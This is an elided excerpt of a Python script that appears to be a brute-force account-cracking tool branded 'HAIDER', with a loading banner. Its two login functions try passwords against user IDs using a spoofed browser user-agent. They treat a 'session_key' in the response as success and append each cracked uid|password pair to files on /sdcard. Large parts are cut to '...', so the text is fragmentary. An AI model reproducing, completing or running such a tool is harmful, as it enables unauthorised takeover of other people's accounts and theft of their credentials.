...
os.system('clear')
print(' \x1b[38;5;46mHAIDER SERVER LOADING....')
...
# Set window title
sys.stdout.write('\x1b]2;𓆩【 H A I D E R】𓆪 \x07')
...
def login_1(uid):
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            ...
            if 'session_key' in res:
                ...
                open('/sdcard/HAIDER-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
...
def login_2(uid):
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
                ...
                if 'session_key' in str(po):
                    ...
                    open('/sdcard/HAIDER-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
